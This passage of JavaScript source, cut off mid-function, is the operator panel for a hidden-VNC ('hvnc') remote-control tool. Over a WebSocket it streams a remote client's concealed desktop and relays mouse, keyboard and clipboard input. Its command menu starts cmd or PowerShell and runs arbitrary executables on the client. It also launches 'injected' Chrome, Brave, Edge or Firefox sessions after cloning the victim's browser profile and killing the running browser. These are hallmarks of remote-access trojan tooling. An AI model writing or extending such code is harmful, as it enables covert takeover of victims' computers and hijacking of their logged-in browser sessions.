import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";

(function () {
  const clientId = new URLSearchParams(location.search).get("clientId");
  if (!clientId) {
    alert("Missing clientId");
    return;
  }
  const clientLabel = document.getElementById("clientLabel");
  clientLabel.textContent = clientId;

  let ws = null;
  let reconnectTimer = null;
  let reconnectDelay = 1000;
  const maxReconnectDelay = 15000;

  function buildWsUrl() {
    return (location.protocol === "https:" ? "wss://" : "ws://") +
      location.host +
      "/api/clients/" +
      clientId +
      "/hvnc/ws";
  }

  function connectWs() {
    if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
    ws = new WebSocket(buildWsUrl());
    ws.binaryType = "arraybuffer";
    ws.addEventListener("open", onWsOpen);
    ws.addEventListener("message", onWsMessage);
    ws.addEventListener("close", onWsClose);
    ws.addEventListener("error", onWsError);
  }

  function scheduleReconnect() {
    if (reconnectTimer) return;
    reconnectTimer = setTimeout(() => {
      reconnectTimer = null;
      setStreamState("connecting", "Reconnecting");
      connectWs();
      reconnectDelay = Math.min(reconnectDelay * 1.5, maxReconnectDelay);
    }, reconnectDelay);
  }
  const latencyEl = document.getElementById("latencyDisplay");
  let lastInputSentAt = 0;
  let lastLatencyMs = 0;

  const displaySelect = document.getElementById("displaySelect");
  const refreshBtn = document.getElementById("refreshDisplays");
  const startBtn = document.getElementById("startBtn");
  const stopBtn = document.getElementById("stopBtn");
  const commandsBtn = document.getElementById("commandsBtn");
  const fullscreenBtn = document.getElementById("fullscreenBtn");
  const mouseCtrl = document.getElementById("mouseCtrl");
  const kbdCtrl = document.getElementById("kbdCtrl");
  const cursorCtrl = document.getElementById("cursorCtrl");
  const autoExplorerCtrl = document.getElementById("autoExplorerCtrl");
  const qualitySlider = document.getElementById("qualitySlider");
  const qualityValue = document.getElementById("qualityValue");
  const codecH264 = document.getElementById("codecH264");
  const codecMode = document.getElementById("codecMode");
  const canvas = document.getElementById("frameCanvas");
  const canvasContainer = document.getElementById("canvasContainer");
  const contextMenu = document.getElementById("hvncContextMenu");
  const ctx = canvas.getContext("2d");
  const agentFps = document.getElementById("agentFps");
  const viewerFps = document.getElementById("viewerFps");
  const statusEl = document.getElementById("streamStatus");
  const clipboardSyncCtrl = document.getElementById("clipboardSyncCtrl");

  function syncInputEnableState() {
    if (mouseCtrl) sendCmd("hvnc_enable_mouse", { enabled: mouseCtrl.checked });
    if (kbdCtrl) sendCmd("hvnc_enable_keyboard", { enabled: kbdCtrl.checked });
    if (cursorCtrl) sendCmd("hvnc_enable_cursor", { enabled: cursorCtrl.checked });
  }
  let activeClientId = clientId;
  let renderCount = 0;
  let renderWindowStart = performance.now();
  let lastFrameAt = 0;
  let desiredStreaming = false;
  let streamState = "connecting";
  let frameWatchTimer = null;
  let offlineTimer = null;
  let pendingMove = null;
  let moveTimer = null;
  let videoDecoder = null;
  let h264TimestampUs = 0;
  const codecPrefKey = "hvncCodecPreferH264";
  let prefersH264 = typeof VideoDecoder === "function";
  let lastMoveSentAt = 0;
  const mouseMoveIntervalMs = 33;
  const inputBackpressureBytes = 256 * 1024;
  let h264ErrorCount = 0;
  let h264RetryTimer = null;

  let clipboardSyncTimer = null;
  let lastClipboardText = "";
  let clipboardSyncActive = false;

  const storedCodecPref = localStorage.getItem(codecPrefKey);
  if (storedCodecPref === "0") {
    prefersH264 = false;
  } else if (storedCodecPref === "1") {
    prefersH264 = typeof VideoDecoder === "function";
  }
  if (codecH264) {
    codecH264.checked = prefersH264;
    codecH264.disabled = typeof VideoDecoder !== "function";
  }

  function setCodecModeLabel(mode, detail) {
    if (!codecMode) return;
    const suffix = detail ? ` (${detail})` : "";
    codecMode.textContent = `Codec: ${String(mode || "auto").toUpperCase()}${suffix}`;
  }

  setCodecModeLabel(prefersH264 ? "h264" : "jpeg", "preferred");
  setStreamState("connecting", "Connecting");

  function updateFpsDisplay(agentValue) {
    if (agentValue !== undefined && agentValue !== null && agentFps) {
      agentFps.textContent = String(agentValue);
    }
    const now = performance.now();
    renderCount += 1;
    const elapsed = now - renderWindowStart;
    if (elapsed >= 1000 && viewerFps) {
      const fps = Math.round((renderCount * 1000) / elapsed);
      viewerFps.textContent = String(fps);
      renderCount = 0;
      renderWindowStart = now;
    }
  }

  function setStreamState(state, text) {
    streamState = state;
    if (statusEl) {
      const icons = {
        connecting: '<i class="fa-solid fa-circle-notch fa-spin"></i>',
        starting: '<i class="fa-solid fa-circle-notch fa-spin"></i>',
        stopping: '<i class="fa-solid fa-circle-notch fa-spin"></i>',
        streaming: '<i class="fa-solid fa-circle text-violet-400"></i>',
        idle: '<i class="fa-solid fa-circle text-slate-400"></i>',
        stalled: '<i class="fa-solid fa-triangle-exclamation text-amber-400"></i>',
        offline: '<i class="fa-solid fa-plug-circle-xmark text-rose-400"></i>',
        disconnected: '<i class="fa-solid fa-link-slash text-slate-400"></i>',
        error: '<i class="fa-solid fa-circle-exclamation text-rose-400"></i>',
      };
      const label = text ||
        (state === "streaming" ? "Streaming" :
          state === "starting" ? "Starting" :
            state === "stopping" ? "Stopping" :
              state === "offline" ? "Client offline" :
                state === "disconnected" ? "Disconnected" :
                  state === "stalled" ? "No frames" :
                    state === "idle" ? "Stopped" :
                      "Connecting");

      statusEl.innerHTML = `${icons[state] || icons.idle} <span>${label}</span>`;
      const base = "inline-flex items-center gap-2 px-3 py-2 rounded-full border text-sm";
      const styles = {
        streaming: "bg-violet-900/40 text-violet-100 border-violet-700/70",
        starting: "bg-sky-900/40 text-sky-100 border-sky-700/70",
        stopping: "bg-amber-900/40 text-amber-100 border-amber-700/70",
        stalled: "bg-amber-900/40 text-amber-100 border-amber-700/70",
        offline: "bg-rose-900/40 text-rose-100 border-rose-700/70",
        error: "bg-rose-900/40 text-rose-100 border-rose-700/70",
        disconnected: "bg-slate-800 text-slate-300 border-slate-700",
        idle: "bg-slate-800 text-slate-300 border-slate-700",
        connecting: "bg-slate-800 text-slate-300 border-slate-700",
      };
      statusEl.className = `${base} ${styles[state] || styles.idle}`;
    }

    if (canvasContainer) {
      canvasContainer.dataset.streamState = state;
    }

    if (state === "idle" || state === "offline" || state === "disconnected" || state === "error") {
      if (agentFps) agentFps.textContent = "--";
      if (viewerFps) viewerFps.textContent = "--";
      renderCount = 0;
      renderWindowStart = performance.now();
    }

    updateControls();
    checkClipboardSync();
  }

  function updateControls() {
    const wsOpen = ws && ws.readyState === WebSocket.OPEN;
    const isStarting = streamState === "starting";
    const isStreaming = streamState === "streaming";
    const isStopping = streamState === "stopping";
    const isBlocked = streamState === "offline" || streamState === "disconnected" || streamState === "error";

    if (startBtn) {
      startBtn.disabled = !wsOpen || isStarting || isStreaming || isStopping || isBlocked;
    }
    if (stopBtn) {
      stopBtn.disabled = !wsOpen || (!isStarting && !isStreaming);
    }
  }

  function startClipboardSync() {
    if (clipboardSyncActive) return;
    clipboardSyncActive = true;
    lastClipboardText = "";
    sendCmd("clipboard_sync_start", {});
    clipboardSyncTimer = setInterval(async () => {
      if (!clipboardSyncCtrl || !clipboardSyncCtrl.checked || streamState !== "streaming") {
        stopClipboardSync();
        return;
      }
      try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboardText) {
          lastClipboardText = text;
          sendCmd("clipboard_sync", { text });
        }
      } catch {}
    }, 1500);
  }

  function stopClipboardSync() {
    if (!clipboardSyncActive) return;
    clipboardSyncActive = false;
    if (clipboardSyncTimer) {
      clearInterval(clipboardSyncTimer);
      clipboardSyncTimer = null;
    }
    sendCmd("clipboard_sync_stop", {});
  }

  function checkClipboardSync() {
    const shouldSync = clipboardSyncCtrl && clipboardSyncCtrl.checked && streamState === "streaming";
    if (shouldSync && !clipboardSyncActive) {
      startClipboardSync();
    } else if (!shouldSync && clipboardSyncActive) {
      stopClipboardSync();
    }
  }

  if (clipboardSyncCtrl) {
    clipboardSyncCtrl.addEventListener("change", checkClipboardSync);
  }

  function clearOfflineTimer() {
    if (offlineTimer) {
      clearTimeout(offlineTimer);
      offlineTimer = null;
    }
  }

  function scheduleOffline(reason) {
    clearOfflineTimer();
    setStreamState("connecting", "Reconnecting");
    offlineTimer = setTimeout(() => {
      const now = performance.now();
      if (!lastFrameAt || now - lastFrameAt > 3000) {
        desiredStreaming = false;
        setStreamState("offline", reason || "Client offline");
      }
    }, 3000);
  }

  function handleStatus(msg) {
    if (!msg || msg.type !== "status" || !msg.status) return;
    if (msg.status === "offline") {
      scheduleOffline(msg.reason);
      return;
    }
    if (msg.status === "connecting") {
      clearOfflineTimer();
      setStreamState("connecting", "Connecting");
      return;
    }
    if (msg.status === "online") {
      clearOfflineTimer();
      if (desiredStreaming) {
        setStreamState("starting", "Reconnecting");
        if (displaySelect && displaySelect.value !== undefined) {
          sendCmd("hvnc_select_display", {
            display: parseInt(displaySelect.value, 10) || 0,
          });
        }
        sendCmd("hvnc_start", {
          autoStartExplorer: false,
        });
        syncInputEnableState();
      } else {
        setStreamState("idle", "Stopped");
      }
    }
  }

  const cloneProgressEl = document.getElementById("cloneProgress");
  const cloneProgressBar = document.getElementById("cloneProgressBar");
  const cloneProgressPct = document.getElementById("cloneProgressPct");
  const cloneProgressLabel = document.getElementById("cloneProgressLabel");
  let cloneHideTimer = null;

  function handleCloneProgress(msg) {
    if (!cloneProgressEl) return;
    const pct = Math.min(100, Math.max(0, Number(msg.percent) || 0));
    const status = msg.status || "";
    const browser = msg.browser || "";
    const totalMB = ((Number(msg.totalBytes) || 0) / (1024 * 1024)).toFixed(1);
    const copiedMB = ((Number(msg.copiedBytes) || 0) / (1024 * 1024)).toFixed(1);

    if (cloneHideTimer) {
      clearTimeout(cloneHideTimer);
      cloneHideTimer = null;
    }

    if (status === "done") {
      cloneProgressBar.style.width = "100%";
      cloneProgressPct.textContent = "100%";
      cloneProgressLabel.textContent = `${browser} clone complete`;
      cloneHideTimer = setTimeout(() => {
        cloneProgressEl.classList.add("hidden");
        cloneProgressEl.classList.remove("flex");
      }, 3000);
      return;
    }

    cloneProgressEl.classList.remove("hidden");
    cloneProgressEl.classList.add("flex");

    if (status === "scanning") {
      cloneProgressBar.style.width = "0%";
      cloneProgressPct.textContent = "…";
      cloneProgressLabel.textContent = `Scanning ${browser} profile`;
      return;
    }

    cloneProgressBar.style.width = `${pct}%`;
    cloneProgressPct.textContent = `${pct}%`;
    cloneProgressLabel.textContent = `Cloning ${browser} — ${copiedMB} / ${totalMB} MB`;
  }

  function sendCmd(type, payload) {
    if (!activeClientId) {
      console.warn("No active client selected");
      return;
    }
    if (!ws || ws.readyState !== WebSocket.OPEN) {
      return;
    }
    const msg = { type, ...payload };
    console.debug("hvnc: send", msg);
    ws.send(encodeMsgpack(msg));
  }

  let monitors = 1;

  function populateDisplays(count) {
    displaySelect.innerHTML = "";
    monitors = count || 1;
    for (let i = 0; i < monitors; i++) {
      const opt = document.createElement("option");
      opt.value = i;
      opt.textContent = "Display " + (i + 1);
      displaySelect.appendChild(opt);
    }

    if (displaySelect.options.length) {
      displaySelect.value = displaySelect.options[0].value;
    }
  }

  async function fetchClientInfo() {
    try {
      const res = await fetch("/api/clients");
      const data = await res.json();
      const client = data.items.find((c) => c.id === activeClientId);
      if (client) {
        clientLabel.textContent = `${client.host || client.id} (${client.os || ""})`;
      }
      if (client && client.monitors) {
        populateDisplays(client.monitors);
      }
    } catch (e) {
      console.warn("failed to fetch client info", e);
    }
  }

  refreshBtn.addEventListener("click", fetchClientInfo);

  function updateQualityLabel(val) {
    if (qualityValue) {
      qualityValue.textContent = `${val}%`;
    }
  }

  function pushQuality(val) {
    const q = Number(val) || 90;
    const codec = q >= 100 ? "raw" : (prefersH264 ? "h264" : "jpeg");
    console.debug("hvnc: pushQuality val=", val, "q=", q, "codec=", codec);
    setCodecModeLabel(codec, "requested");
    sendCmd("hvnc_set_quality", { quality: q, codec });
  }

  if (codecH264) {
    codecH264.addEventListener("change", function () {
      prefersH264 = !!codecH264.checked && typeof VideoDecoder === "function";
      localStorage.setItem(codecPrefKey, prefersH264 ? "1" : "0");
      if (!prefersH264) {
        destroyVideoDecoder();
      }
      if (qualitySlider) {
        pushQuality(qualitySlider.value);
      }
    });
  }

  function destroyVideoDecoder() {
    if (!videoDecoder) return;
    try {
      videoDecoder.close();
    } catch {
      // Ignore decoder close errors.
    }
    videoDecoder = null;
    h264TimestampUs = 0;
  }

  function fallbackToJpegCodec(reason) {
    if (!prefersH264) return;
    h264ErrorCount++;
    prefersH264 = false;
    destroyVideoDecoder();
    if (codecH264) codecH264.checked = false;
    console.warn("hvnc: falling back to jpeg codec", reason || "", "errors:", h264ErrorCount);
    const q = Number(qualitySlider?.value) || 90;
    setCodecModeLabel("jpeg", "fallback");
    if (ws && ws.readyState === WebSocket.OPEN) {
      sendCmd("hvnc_set_quality", { quality: q, codec: "jpeg" });
    }
    if (h264ErrorCount <= 3 && typeof VideoDecoder === "function") {
      if (h264RetryTimer) clearTimeout(h264RetryTimer);
      h264RetryTimer = setTimeout(() => {
        h264RetryTimer = null;
        prefersH264 = true;
        if (codecH264) codecH264.checked = true;
        setCodecModeLabel("h264", "retry");
        if (ws && ws.readyState === WebSocket.OPEN) {
          pushQuality(qualitySlider?.value || 90);
        }
      }, 5000);
    } else if (h264ErrorCount > 3) {
      localStorage.setItem(codecPrefKey, "0");
    }
  }

  function isH264KeyFrame(data) {
    for (let i = 0; i + 4 < data.length; i++) {
      let startCodeLen = 0;
      if (data[i] === 0x00 && data[i + 1] === 0x00 && data[i + 2] === 0x01) {
        startCodeLen = 3;
      } else if (
        i + 4 < data.length &&
        data[i] === 0x00 &&
        data[i + 1] === 0x00 &&
        data[i + 2] === 0x00 &&
        data[i + 3] === 0x01
      ) {
        startCodeLen = 4;
      }
      if (!startCodeLen) continue;
      const nalIndex = i + startCodeLen;
      if (nalIndex >= data.length) break;
      if ((data[nalIndex] & 0x1f) === 5) {
        return true;
      }
      i = nalIndex;
    }
    return false;
  }

  function ensureVideoDecoder() {
    if (videoDecoder) return true;
    if (typeof VideoDecoder !== "function") return false;
    try {
      videoDecoder = new VideoDecoder({
        output: (frame) => {
          const width = frame.displayWidth || frame.codedWidth || canvas.width;
          const height = frame.displayHeight || frame.codedHeight || canvas.height;
          if (width > 0 && height > 0 && (canvas.width !== width || canvas.height !== height)) {
            canvas.width = width;
            canvas.height = height;
          }
          try {
            ctx.drawImage(frame, 0, 0, canvas.width, canvas.height);
          } finally {
            frame.close();
          }
        },
        error: (err) => {
          console.warn("hvnc: h264 decoder error", err);
        },
      });
      videoDecoder.configure({ codec: "avc1.42E01E", optimizeForLatency: true });
      return true;
    } catch (err) {
      console.warn("hvnc: h264 decoder unavailable", err);
      fallbackToJpegCodec(err);
      return false;
    }
  }

  displaySelect.addEventListener("change", function () {
    console.debug("hvnc: select display", displaySelect.value);
    sendCmd("hvnc_select_display", {
      display: parseInt(displaySelect.value, 10),
    });
  });

  startBtn.addEventListener("click", function () {
    if (displaySelect && displaySelect.value !== undefined) {
      sendCmd("hvnc_select_display", {
        display: parseInt(displaySelect.value, 10) || 0,
      });
    }
    if (qualitySlider) {
      pushQuality(qualitySlider.value);
    }
    desiredStreaming = true;
    lastFrameAt = 0;
    setStreamState("starting", "Starting stream");
    sendCmd("hvnc_start", {
      autoStartExplorer: false,
    });
    syncInputEnableState();
  });
  stopBtn.addEventListener("click", function () {
    desiredStreaming = false;
    setStreamState("stopping", "Stopping stream");
    sendCmd("hvnc_stop", {});
  });
  fullscreenBtn.addEventListener("click", function () {
    if (canvasContainer.requestFullscreen) {
      canvasContainer.requestFullscreen();
    } else if (canvasContainer.webkitRequestFullscreen) {
      canvasContainer.webkitRequestFullscreen();
    } else if (canvasContainer.mozRequestFullScreen) {
      canvasContainer.mozRequestFullScreen();
    }
  });
  mouseCtrl.addEventListener("change", function () {
    sendCmd("hvnc_enable_mouse", { enabled: mouseCtrl.checked });
  });
  kbdCtrl.addEventListener("change", function () {
    sendCmd("hvnc_enable_keyboard", { enabled: kbdCtrl.checked });
  });
  cursorCtrl.addEventListener("change", function () {
    sendCmd("hvnc_enable_cursor", { enabled: cursorCtrl.checked });
  });

  if (qualitySlider) {
    updateQualityLabel(qualitySlider.value);
    qualitySlider.addEventListener("input", function () {
      updateQualityLabel(qualitySlider.value);
      pushQuality(qualitySlider.value);
    });
  }

  async function onWsMessage(ev) {
    if (ev.data instanceof ArrayBuffer) {
      const buf = new Uint8Array(ev.data);
      if (buf.length >= 8 && buf[0] === 0x46 && buf[1] === 0x52 && buf[2] === 0x4d) {
        const fps = buf[5];
        const format = buf[6];
        lastFrameAt = performance.now();
        clearOfflineTimer();
        if (streamState !== "streaming") {
          desiredStreaming = true;
          setStreamState("streaming", "Streaming");
        }

        if (format === 1) {
          const jpegBytes = buf.slice(8);
          setCodecModeLabel("jpeg", "active");
          const blob = new Blob([jpegBytes], { type: "image/jpeg" });
          try {
            const bitmap = await createImageBitmap(blob);
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            ctx.drawImage(bitmap, 0, 0);
            bitmap.close();
            updateFpsDisplay(fps);
          } catch {
            const img = new Image();
            const url = URL.createObjectURL(blob);
            img.onload = function () {
              canvas.width = img.width;
              canvas.height = img.height;
              ctx.drawImage(img, 0, 0);
              URL.revokeObjectURL(url);
              updateFpsDisplay(fps);
            };
            img.src = url;
          }
          return;
        }

        if (format === 2 || format === 3) {
          setCodecModeLabel(format === 3 ? "raw" : "jpeg", "blocks");
          if (buf.length < 8 + 8) return;
          const dv = new DataView(buf.buffer, 8);
          let pos = 0;
          const width = dv.getUint16(pos, true);
          pos += 2;
          const height = dv.getUint16(pos, true);
          pos += 2;
          const blockCount = dv.getUint16(pos, true);
          pos += 2;
          pos += 2;

          if (
            width > 0 &&
            height > 0 &&
            (canvas.width !== width || canvas.height !== height)
          ) {
            canvas.width = width;
            canvas.height = height;
          }
          for (let i = 0; i < blockCount; i++) {
            if (pos + 12 > dv.byteLength) break;
            const x = dv.getUint16(pos, true);
            pos += 2;
            const y = dv.getUint16(pos, true);
            pos += 2;
            const w = dv.getUint16(pos, true);
            pos += 2;
            const h = dv.getUint16(pos, true);
            pos += 2;
            const len = dv.getUint32(pos, true);
            pos += 4;
            const start = 8 + pos;
            const end = start + len;
            if (end > buf.length) break;
            const slice = buf.subarray(start, end);
            pos += len;
            if (format === 2) {
              try {
                const bitmap = await createImageBitmap(
                  new Blob([slice], { type: "image/jpeg" }),
                );
                ctx.drawImage(bitmap, x, y, w, h);
                bitmap.close();
              } catch {}
            } else {
              if (slice.length === w * h * 4) {
                const imgData = new ImageData(new Uint8ClampedArray(slice), w, h);
                ctx.putImageData(imgData, x, y);
              }
            }
          }
          updateFpsDisplay(fps);
          return;
        }

        if (format === 4) {
          setCodecModeLabel("h264", "active");
          const h264Bytes = buf.slice(8);
          if (!h264Bytes.length) return;
          if (!ensureVideoDecoder()) {
            fallbackToJpegCodec("WebCodecs decoder unavailable");
            return;
          }
          const frameIntervalUs = Math.floor(1_000_000 / Math.max(1, fps || 25));
          const chunk = new EncodedVideoChunk({
            type: isH264KeyFrame(h264Bytes) ? "key" : "delta",
            timestamp: h264TimestampUs,
            data: h264Bytes,
          });
          h264TimestampUs += frameIntervalUs;
          try {
            videoDecoder.decode(chunk);
            updateFpsDisplay(fps);
          } catch (err) {
            console.warn("hvnc: h264 decode failed", err);
            fallbackToJpegCodec(err);
          }
          return;
        }
      }

      const msg = decodeMsgpack(buf);
      if (msg && msg.type === "status" && msg.status) {
        handleStatus(msg);
        return;
      }
      if (msg && msg.type === "hvnc_clone_progress") {
        handleCloneProgress(msg);
        return;
      }
      if (msg && msg.type === "hvnc_lookup_result") {
        handleLookupResult(msg);
        return;
      }
      if (msg && msg.type === "hvnc_error") {
        console.error("hvnc: server error:", msg.error || msg.message);
        return;
      }
      if (msg && msg.type === "clipboard_content") {
        if (clipboardSyncCtrl && clipboardSyncCtrl.checked && streamState === "streaming" && msg.text) {
          lastClipboardText = msg.text;
          navigator.clipboard.writeText(msg.text).catch(() => {});
        }
        return;
      }
      return;
    }

    const msg = decodeMsgpack(ev.data);
    if (msg && msg.type === "status" && msg.status) {
      handleStatus(msg);
      return;
    }
    if (msg && msg.type === "hvnc_clone_progress") {
      handleCloneProgress(msg);
      return;
    }
    if (msg && msg.type === "hvnc_lookup_result") {
      handleLookupResult(msg);
      return;
    }
    if (msg && msg.type === "hvnc_error") {
      console.error("hvnc: server error:", msg.error || msg.message);
      return;
    }
    if (msg && msg.type === "clipboard_content") {
      if (clipboardSyncCtrl && clipboardSyncCtrl.checked && streamState === "streaming" && msg.text) {
        lastClipboardText = msg.text;
        navigator.clipboard.writeText(msg.text).catch(() => {});
      }
      return;
    }
  }

  function onWsOpen() {
    reconnectDelay = 1000;
    if (qualitySlider) {
      pushQuality(qualitySlider.value);
    }
    clearOfflineTimer();
    if (desiredStreaming) {
      setStreamState("starting", "Resuming stream");
      if (displaySelect && displaySelect.value !== undefined) {
        sendCmd("hvnc_select_display", { display: parseInt(displaySelect.value, 10) || 0 });
      }
      sendCmd("hvnc_start", { autoStartExplorer: false });
      syncInputEnableState();
    } else {
      setStreamState("idle", "Stopped");
    }
    fetchClientInfo().then(() => {
      if (displaySelect && displaySelect.value) {
        sendCmd("hvnc_select_display", { display: parseInt(displaySelect.value, 10) });
      }
    });
  }

  function onWsClose() {
    destroyVideoDecoder();
    if (desiredStreaming) {
      setStreamState("connecting", "Reconnecting");
      scheduleReconnect();
    } else {
      setStreamState("disconnected", "Disconnected");
    }
  }

  function onWsError() {
    destroyVideoDecoder();
    setStreamState("error", "WebSocket error");
  }

  if (!frameWatchTimer) {
    frameWatchTimer = setInterval(() => {
      const now = performance.now();
      if (desiredStreaming) {
        if (lastFrameAt && now - lastFrameAt > 2000) {
          setStreamState("stalled", "No frames");
        } else if (!lastFrameAt && streamState === "starting") {
          setStreamState("starting", "Starting stream");
        }
      } else if (streamState !== "offline" && streamState !== "disconnected" && streamState !== "error") {
        if (streamState !== "idle") {
          setStreamState("idle", "Stopped");
        }
      }
    }, 1000);
  }

  function getCanvasPoint(e) {
    let rect = canvas.getBoundingClientRect();
    if (!rect.width || !rect.height) {
      rect = canvasContainer?.getBoundingClientRect() || rect;
    }
    if (!rect.width || !rect.height || !canvas.width || !canvas.height) return null;
    let x = ((e.clientX - rect.left) / rect.width) * canvas.width;
    let y = ((e.clientY - rect.top) / rect.height) * canvas.height;
    if (!Number.isFinite(x) || !Number.isFinite(y)) return null;
    x = Math.max(0, Math.min(canvas.width - 1, Math.floor(x)));
    y = Math.max(0, Math.min(canvas.height - 1, Math.floor(y)));
    return { x, y };
  }

  function flushMouseMove() {
    moveTimer = null;
    if (!pendingMove || !mouseCtrl.checked) return;
    const now = performance.now();
    if (now - lastMoveSentAt < mouseMoveIntervalMs) {
      if (!moveTimer) {
        moveTimer = setTimeout(flushMouseMove, mouseMoveIntervalMs);
      }
      return;
    }
    lastMoveSentAt = now;
    if (ws.bufferedAmount <= inputBackpressureBytes) {
      sendCmd("hvnc_mouse_move", pendingMove);
    }
  }

  canvas.addEventListener("mousemove", function (e) {
    if (!mouseCtrl.checked) return;
    const pt = getCanvasPoint(e);
    if (!pt) return;
    pendingMove = pt;
    if (!moveTimer) {
      flushMouseMove();
    }
  });
  canvas.addEventListener("mousedown", function (e) {
    if (!mouseCtrl.checked) return;
    canvas.focus({ preventScroll: true });
    const pt = getCanvasPoint(e);
    if (pt) {
      pendingMove = pt;
      if (ws.bufferedAmount <= inputBackpressureBytes) {
        sendCmd("hvnc_mouse_move", pt);
      }
    }
    sendCmd("hvnc_mouse_down", { button: e.button, ...(pt || {}) });
    e.preventDefault();
  });
  canvas.addEventListener("mouseup", function (e) {
    if (!mouseCtrl.checked) return;
    const pt = getCanvasPoint(e);
    if (pt) {
      pendingMove = pt;
      if (ws.bufferedAmount <= inputBackpressureBytes) {
        sendCmd("hvnc_mouse_move", pt);
      }
    }
    sendCmd("hvnc_mouse_up", { button: e.button, ...(pt || {}) });
    e.preventDefault();
  });
  canvas.addEventListener("contextmenu", function (e) {
    e.preventDefault();
  });

  canvas.addEventListener("wheel", function (e) {
    if (!mouseCtrl.checked) return;
    const pt = getCanvasPoint(e);
    if (!pt) return;
    const delta = Math.max(-120, Math.min(120, Math.round(-e.deltaY)));
    sendCmd("hvnc_mouse_wheel", { delta, x: pt.x, y: pt.y });
    e.preventDefault();
  }, { passive: false });

  canvas.setAttribute("tabindex", "0");
  canvas.addEventListener("click", function () {
    canvas.focus({ preventScroll: true });
  });
  if (kbdCtrl) {
    kbdCtrl.addEventListener("change", function () {
      if (kbdCtrl.checked) {
        canvas.focus({ preventScroll: true });
      }
    });
  }
  canvas.addEventListener("keydown", function (e) {
    if (!kbdCtrl.checked) return;
    sendCmd("hvnc_key_down", { key: e.key, code: e.code });
    e.preventDefault();
  });
  canvas.addEventListener("keyup", function (e) {
    if (!kbdCtrl.checked) return;
    sendCmd("hvnc_key_up", { key: e.key, code: e.code });
    e.preventDefault();
  });

  function stopOnExit() {
    if (ws && ws.readyState === WebSocket.OPEN && desiredStreaming) {
      desiredStreaming = false;
      sendCmd("hvnc_stop", {});
    }
    destroyVideoDecoder();
  }

  window.addEventListener("beforeunload", stopOnExit);
  window.addEventListener("pagehide", stopOnExit);

  function hideContextMenu() {
    if (!contextMenu) return;
    contextMenu.classList.add("hidden");
  }

  function showContextMenuAt(x, y) {
    if (!contextMenu) return;
    contextMenu.style.left = `${x}px`;
    contextMenu.style.top = `${y}px`;
    contextMenu.classList.remove("hidden");
  }

  document.addEventListener("click", (e) => {
    if (!contextMenu) return;
    if (commandsBtn && commandsBtn.contains(e.target)) {
      return;
    }
    if (!contextMenu.contains(e.target)) {
      hideContextMenu();
    }
  });

  if (commandsBtn) {
    commandsBtn.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation();
      const rect = commandsBtn.getBoundingClientRect();
      showContextMenuAt(rect.left, rect.bottom + 6);
    });
  }

  if (contextMenu) {
    contextMenu.querySelectorAll("[data-action]").forEach((item) => {
      item.addEventListener("click", (e) => {
        const action = e.currentTarget?.dataset?.action;
        if (action === "start-cmd") {
          sendCmd("hvnc_start_process", { path: "conhost cmd.exe" });
        } else if (action === "start-powershell") {
          sendCmd("hvnc_start_process", { path: "conhost powershell.exe" });
        } else if (action === "start-chrome") {
          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
          sendCmd("hvnc_start_browser_injected", { browser: "chrome", clone, cloneLite, killIfRunning });
        } else if (action === "start-brave") {
          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
          sendCmd("hvnc_start_browser_injected", { browser: "brave", clone, cloneLite, killIfRunning });
        } else if (action === "start-edge") {
          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
          sendCmd("hvnc_start_browser_injected", { browser: "edge", clone, cloneLite, killIfRunning });
        } else if (action === "start-firefox") {
          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
          sendCmd("hvnc_start_browser_injected", { browser: "firefox", clone, cloneLite, killIfRunning });
        } else if (action === "start-custom") {
          hideContextMenu();
          showCustomExeModal();
          return;
        } else if (action === "lookup-exe") {
          hideContextMenu();
          showLookupExeModal();
          return;
        }
        hideContextMenu();
      });
    });
  }

  function showCustomExeModal() {
    let overlay = document.getElementById("hvncCustomExeOverlay");
    if (overlay) { overlay.remove(); }
    overlay = document.createElement("div");
    overlay.id = "hvncCustomExeOverlay";
    overlay.className = "fixed inset-0 z-[100] flex items-center justify-center bg-black/60";
    overlay.innerHTML = `
      <div class="bg-slate-900 border border-slate-700 rounded-xl p-5 w-96 shadow-2xl">
        <div class="text-sm font-semibold text-slate-100 mb-3">Run Custom Executable</div>
        <label class="block text-xs text-slate-400 mb-1">Exe path</label>
        <input id="hvncCustomExePath" type="text" placeholder="C:\\path\\to\\app.exe"
          class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100 mb-3 focus:outline-none focus:border-violet-500" />
        <label class="block text-xs text-slate-400 mb-1">Arguments (optional)</label>
        <input id="hvncCustomExeArgs" type="text" placeholder="--flag value"
          class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100 mb-4 focus:outline-none focus:border-violet-500" />
        <div class="flex justify-end gap-2">
          <button id="hvncCustomExeCancel" class="button ghost text-sm">Cancel</button>
          <button id="hvncCustomExeRun" class="button primary text-sm">Run</button>
        </div>
      </div>`;
    document.body.appendChild(overlay);
    const pathInput = document.getElementById("hvncCustomExePath");
    const argsInput = document.getElementById("hvncCustomExeArgs");
    pathInput.focus();
    function close() { overlay.remove(); }
    document.getElementById("hvncCustomExeCancel").addEventListener("click", close);
    overlay.addEventListener("click", (e) => { if (e.target === overlay) close(); });
    function run() {
      const exePath = pathInput.value.trim();
      if (!exePath) return;
      const args = argsInput.value.trim();
      const cmd = args ? `"${exePath}" ${args}` : `"${exePath}"`;
      sendCmd("hvnc_start_process", { path: cmd });
      close();
    }
    document.getElementById("hvncCustomExeRun").addEventListener("click", run);
    pathInput.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); argsInput.focus(); } });
